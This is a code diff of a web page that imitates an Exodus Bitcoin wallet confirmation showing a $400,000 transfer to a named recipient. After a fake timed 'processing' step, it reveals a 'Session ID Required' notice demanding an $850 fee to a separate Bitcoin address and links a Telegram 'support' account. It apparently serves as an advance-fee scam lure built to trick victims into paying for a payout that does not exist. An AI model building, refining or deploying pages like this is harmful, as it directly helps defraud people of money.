-      margin-top: 2rem;
+      width: min(420px, 100%);
+      height: 220px;
       object-fit: cover;
-      border: 1px solid rgba(248, 113, 113, 0.1);
+      border-radius: 14px;
+      border: 1px solid rgba(247, 147, 26, 0.2);
+      margin-top: 0.5rem;
+      flex-shrink: 0;
+      animation: fadeInUp 0.6s ease 0.7s both;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
+    }
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
     }
 
     /* ===== RESPONSIVE ===== */
@@ -848,57 +837,43 @@
       }
 
       .container {
-        padding: 1.5rem 1rem;
+        padding: 2rem 1rem 3rem;
+      }
+
+      .details-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .btn-primary, .btn-support, .modal-actions .btn {
+        width: 100%;
+      }
+
+      .button-group {
+        flex-direction: column;
+      }
+
+      .notification-dropdown {
+        right: 10px;
+        top: 72px;
+        width: calc(100vw - 20px);
       }
 
       .page-title {
         font-size: 28px;
       }
 
-      .transaction-card {
-        padding: 2rem;
-      }
-
-      .transaction-amount {
-        font-size: 42px;
-      }
-
-      .modal-content {
-        padding: 1.5rem;
-        max-width: calc(100% - 2rem);
-      }
-
-      .details-grid {
-        gap: 1rem;
-      }
-
-      .button-group {
-        flex-direction: column;
-        gap: 0.75rem;
-      }
-
-      .notification-dropdown {
-        right: 1rem;
-        max-width: calc(100% - 2rem);
-      }
-
-      .confirmation-title {
-        font-size: 24px;
-      }
-
       .confirmation-amount {
-        font-size: 36px;
+        font-size: 44px;
       }
 
-      .btn-primary {
-        min-width: auto;
+      .navbar-left {
+        gap: 12px;
       }
     }
   </style>
 </head>
 <body>
-
-  <!-- ===== WELCOME SCREEN ===== -->
+  <!-- Welcome screen -->
   <div class="welcome-screen" id="welcomeScreen">
     <div class="welcome-content">
       <div class="welcome-icon">₿</div>
@@ -912,112 +887,94 @@
     </div>
   </div>
 
-  <!-- ===== NAVBAR ===== -->
+  <!-- Navbar -->
   <nav class="navbar">
-    <a href="#" class="navbar-brand">₿ Exodus</a>
-
-    <div class="navbar-right">
-      <div class="user-profile">
-        <div class="user-avatar">SO</div>
-        <div class="user-info">
-          <div class="user-name">Stan Ottembrajt</div>
-          <div class="user-status">Bitcoin</div>
-        </div>
+    <div class="navbar-left">
+      <div class="canada-flag">🍁</div>
+      <div class="navbar-brand">₿ Exodus</div>
+    </div>
+    <div class="user-profile">
+      <div class="user-avatar">SO</div>
+      <div>
+        <div class="user-name">Stan Ottembrajt</div>
+        <div class="user-status">Bitcoin</div>
       </div>
     </div>
   </nav>
 
-  <!-- ===== NOTIFICATION DROPDOWN ===== -->
+  <!-- Notification dropdown -->
   <div class="notification-dropdown" id="notificationDropdown">
     <div class="notification-header">
       <div class="notification-icon">🔑</div>
       <div class="notification-title">Session ID Required</div>
     </div>
+
     <div class="notification-message">
       A Session ID is required for this transaction. Your wallet has been confirmed and is ready for transfer.
     </div>
-    <img src="https://via.placeholder.com/350x180?text=View+Certificate" alt="Certificate" class="notification-certificate" id="notificationCertificate">
-    <div class="notification-amount">
-      Transaction Fee: $850
-    </div>
-    <div class="notification-fee-address">
+
+    <img
+      class="notification-certificate"
+      src="transaction-certificate.png"
+      alt="Transaction Certificate"
+    />
+
+    <div class="notification-fee">Transaction Fee: $850</div>
+    <div class="notification-address">
       <strong style="color: #f7931a;">Fee Address:</strong><br>
       bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf
     </div>
   </div>
 
-  <!-- ===== MAIN CONTENT ===== -->
+  <!-- Main page -->
   <div class="container" id="mainContent">
-    <!-- Page Header -->
     <div class="page-header">
       <h1 class="page-title">Transaction Confirmation</h1>
       <p class="page-subtitle">Review and confirm your transaction details</p>
     </div>
 
-    <!-- Transaction Card -->
     <div class="transaction-card">
       <div class="transaction-label">You are sending</div>
       <div class="transaction-type">
         <span class="transaction-icon">₿</span>
         <span>Bitcoin</span>
       </div>
-      <div>
+
+      <div class="amount-row">
         <span class="transaction-amount">$400,000</span>
         <span class="transaction-currency">USD</span>
       </div>
+
       <div class="transaction-divider"></div>
-      <div style="color: #94a3b8; font-size: 14px;">
-        ≈ 10.25 BTC
-      </div>
+
+      <div class="btc-value">≈ 4.82 BTC</div>
     </div>
 
-    <!-- Details Grid -->
     <div class="details-grid">
-      <div class="detail-item">
-        <div class="detail-label">From Account</div>
-        <div class="detail-value">Primary Wallet</div>
+      <div class="info-box">
+        <div class="info-label">From Account</div>
+        <div class="info-value">Primary Wallet</div>
       </div>
-      <div class="detail-item">
-        <div class="detail-label">Network</div>
-        <div class="detail-value">Bitcoin Mainnet</div>
+      <div class="info-box">
+        <div class="info-label">Network</div>
+        <div class="info-value">Bitcoin Mainnet</div>
       </div>
     </div>
 
-    <!-- Recipient Section -->
-    <div class="recipient-section">
-      <div class="recipient-label">Recipient Address (Receiving $400,000)</div>
-      <div class="recipient-value">bc1q9nh4xgf85vx9uappa07drxv598wth0l63d4v3</div>
+    <div class="wallet-block">
+      <div class="info-label">Recipient Address (Stan Ottembrajt)</div>
+      <div class="wallet-address">bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3</div>
     </div>
 
-    <!-- Fee Section -->
-    <div class="fee-section">
-      <div class="fee-label">Transaction Fee</div>
-      <div class="fee-amount">$850</div>
-      <div style="font-size: 12px; color: #94a3b8; margin-bottom: 12px;">Fee Address:</div>
-      <div class="fee-address">bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf</div>
-    </div>
-
-    <!-- Action Button -->
     <div class="button-group">
       <button class="btn btn-primary" id="confirmBtn">Confirm & Send</button>
-      <a href="https://t.me/AcesstBridge_go1" target="_blank" rel="noopener noreferrer" class="btn btn-support">💬 Contact Support</a>
+      <a class="btn btn-support" href="https://t.me/AcesstBridge_go1" target="_blank" rel="noopener noreferrer">
+        💬 Contact Support
+      </a>
     </div>
   </div>
 
-  <!-- ===== CONFIRMATION PAGE ===== -->
-  <div class="confirmation-page" id="confirmationPage">
-    <div class="confirmation-checkmark">✓</div>
-    <div class="confirmation-title">Transaction Confirmed</div>
-    <div class="confirmation-message">Your transaction is being processed</div>
-    <div class="confirmation-amount">$400,000</div>
-    <div class="confirmation-details">
-      <div style="margin-bottom: 12px;">Session ID: #TXN-2024-847392</div>
-      <div>Bitcoin Mainnet</div>
-    </div>
-    <img src="https://via.placeholder.com/400x200?text=Transaction+Certificate" alt="Transaction Certificate" class="confirmation-certificate" id="confirmationCertificate">
-  </div>
-
-  <!-- ===== WALLET CONFIRMATION MODAL ===== -->
+  <!-- Modal -->
   <div class="modal-overlay" id="walletModal">
     <div class="modal-content">
       <button class="modal-close" id="closeModal">×</button>
@@ -1030,24 +987,38 @@
       <div class="wallet-card">
         <div class="wallet-row">
           <div>
-            <div class="wallet-label">Recipient Wallet</div>
+            <div class="wallet-label">Recipient Name</div>
+            <div class="wallet-value">Stan Ottembrajt</div>
           </div>
-        </div>
-        <div class="wallet-address-display">
-          bc1q9nh4xgf85vx9uappa07drxv598wth0l63d4v3
         </div>
 
         <div class="wallet-row">
           <div>
-            <div class="wallet-label">Amount</div>
-            <div class="wallet-value">$400,000 USD</div>
+            <div class="wallet-label">Recipient Wallet</div>
+          </div>
+        </div>
+        <div class="wallet-address" style="margin-top: 8px; margin-bottom: 10px;">
+          bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3
+        </div>
+
+        <div class="wallet-row">
+          <div>
+            <div class="wallet-label">Amount (USD)</div>
+            <div class="wallet-value">$400,000</div>
+          </div>
+        </div>
+
+        <div class="wallet-row">
+          <div>
+            <div class="wallet-label">Amount (BTC)</div>
+            <div class="wallet-value">4.82 BTC</div>
           </div>
         </div>
 
         <div class="wallet-row">
           <div>
             <div class="wallet-label">Network</div>
-            <div class="wallet-value">Bitcoin (BTC)</div>
+            <div class="wallet-value">Bitcoin Mainnet</div>
           </div>
         </div>
 
@@ -1057,38 +1028,42 @@
             <div class="wallet-value">SegWit (bc1)</div>
           </div>
         </div>
-
-        <div class="wallet-row">
-          <div>
-            <div class="wallet-label">Fee Amount</div>
-            <div class="wallet-value">$850 USD</div>
-          </div>
-        </div>
-
-        <div class="wallet-row">
-          <div>
-            <div class="wallet-label">Fee Address</div>
-          </div>
-        </div>
-        <div class="wallet-address-display" style="margin-top: 8px; margin-bottom: 1rem;">
-          bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf
-        </div>
       </div>
 
-      <div style="background: rgba(247, 147, 26, 0.1); border: 1px solid rgba(248, 113, 113, 0.15); border-radius: 8px; padding: 1rem; margin-bottom: 1.5rem; font-size: 13px; color: #cbd5e0; line-height: 1.6;">
+      <div class="warning-box">
         <strong style="color: #f7931a;">⚠️ Important:</strong><br>
-        Verify both the recipient and fee addresses are correct. Transactions cannot be reversed once confirmed.
+        Verify the recipient address is correct. Transactions cannot be reversed once confirmed. The funds will be received by Stan Ottembrajt at the wallet address above.
       </div>
 
-      <div style="display: flex; gap: 1rem;">
+      <div class="modal-actions">
         <button class="btn btn-secondary" id="cancelBtn">Cancel</button>
         <button class="btn btn-primary" id="confirmWalletBtn">Confirm & Proceed</button>
       </div>
     </div>
   </div>
 
+  <!-- Final confirmation screen -->
+  <div class="confirmation-page" id="confirmationPage">
+    <div class="confirmation-check">✓</div>
+    <div class="confirmation-title">Transaction Confirmed</div>
+    <div class="confirmation-message">Your transaction is being processed</div>
+    <div class="confirmation-amount">$400,000</div>
+    <div class="confirmation-btc">4.82 BTC to Stan Ottembrajt</div>
+    <div class="confirmation-details">
+      <div>Session ID: #TXN-2024-847392</div>
+      <div>Bitcoin Mainnet</div>
+      <div style="margin-top: 12px; font-size: 12px; opacity: 0.8;">
+        Receiving Address: bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3
+      </div>
+    </div>
+    <img
+      class="confirmation-certificate"
+      src="transaction-certificate.png"
+      alt="Confirmation Certificate"
+    />
+  </div>
+
   <script>
-    // DOM Elements
     const welcomeScreen = document.getElementById('welcomeScreen');
     const confirmBtn = document.getElementById('confirmBtn');
     const walletModal = document.getElementById('walletModal');
@@ -1099,20 +1074,17 @@
     const mainContent = document.getElementById('mainContent');
     const confirmationPage = document.getElementById('confirmationPage');
 
-    // Show Welcome Screen on Load
     window.addEventListener('load', () => {
       setTimeout(() => {
         welcomeScreen.classList.add('fade-out');
-      }, 3000);
+      }, 2500);
     });
 
-    // Open Wallet Modal
     confirmBtn.addEventListener('click', () => {
       walletModal.classList.add('show');
       document.body.style.overflow = 'hidden';
     });
 
-    // Close Modal
     const closeWalletModal = () => {
       walletModal.classList.remove('show');
       document.body.style.overflow = 'auto';
@@ -1121,32 +1093,24 @@
     closeModal.addEventListener('click', closeWalletModal);
     cancelBtn.addEventListener('click', closeWalletModal);
 
-    // Close modal when clicking outside
     walletModal.addEventListener('click', (e) => {
-      if (e.target === walletModal) {
-        closeWalletModal();
-      }
+      if (e.target === walletModal) closeWalletModal();
     });
 
-    // Confirm Wallet and Show Loading
     confirmWalletBtn.addEventListener('click', () => {
       confirmWalletBtn.disabled = true;
       confirmWalletBtn.classList.add('btn-loading');
       confirmWalletBtn.textContent = '';
 
-      // Simulate processing
       setTimeout(() => {
         closeWalletModal();
-        
-        // Show notification with smooth animation
+
         notificationDropdown.classList.add('show');
 
-        // Auto-hide notification after 6 seconds
         setTimeout(() => {
           notificationDropdown.classList.remove('show');
         }, 6000);
 
-        // Fade out main content and show confirmation with smooth transition
         setTimeout(() => {
           mainContent.style.opacity = '0';
           mainContent.style.pointerEvents = 'none';
@@ -1155,11 +1119,10 @@
           }, 300);
         }, 1000);
 
-        // Reset button
         confirmWalletBtn.disabled = false;
         confirmWalletBtn.classList.remove('btn-loading');
         confirmWalletBtn.textContent = 'Confirm & Proceed';
-      }, 2000);
+      }, 1800);
     });
   </script>
 </body>
